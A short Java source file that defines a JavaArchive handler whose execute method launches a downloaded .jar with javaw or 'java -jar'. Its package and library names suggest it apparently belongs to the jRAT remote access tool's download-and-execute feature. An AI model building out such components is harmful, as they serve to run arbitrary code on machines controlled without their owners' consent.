package se.jrat.common.downloadable;

import java.io.File;

import com.redpois0n.oslib.OperatingSystem;


public class JavaArchive extends Downloadable {

	@Override
	public String getExtension() {
		return ".jar";
	}

	@Override
	public void execute(File file) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", file.getAbsolutePath() });
		} else {
			Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath() });
		}
	}

}
